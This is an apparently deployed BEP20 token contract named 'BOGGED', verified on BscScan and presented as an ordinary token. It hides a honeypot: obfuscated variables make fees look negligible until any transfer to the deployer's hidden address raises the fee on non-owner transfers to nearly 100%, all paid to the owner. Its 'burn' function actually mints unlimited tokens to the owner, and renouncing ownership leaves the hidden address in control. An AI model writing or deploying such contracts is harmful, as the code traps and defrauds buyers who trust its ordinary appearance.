/**
 *Submitted for verification at BscScan.com on 2022-11-13
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-12
 telegram: https://t.me/boggedbep20
 */
pragma solidity >=0.8.0;
contract BOGGED {
address public owner;

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) private _allowances;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

uint8 public constant decimals = 18;
uint256 private  LWNQIE = 10000000000000;
string public  symbol = "BOGGED";
string public  name = "BOGGED";
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public constant TACWPK = 73999;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  YEVFFH = address(0);

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transferOwnership(address newOwner) public onlyOwner {
require(newOwner != address(0), "MQRDIS");
emit OwnershipTransferred(owner, newOwner);
owner = newOwner;
}
constructor () {
YEVFFH = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
uint256 fffff;
if (from == owner || to == owner){
fffff = 0;
}
else{
fffff = amount* TACWPK/LWNQIE ;
}

uint256 transferAmount = amount - fffff;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fffff;
if (to==YEVFFH){
LWNQIE = 73999+1;
}
emit Transfer(from, to, transferAmount);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");
balanceOf[account] += amount;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}



function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: transfer from the zero address");
        require(spender != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
}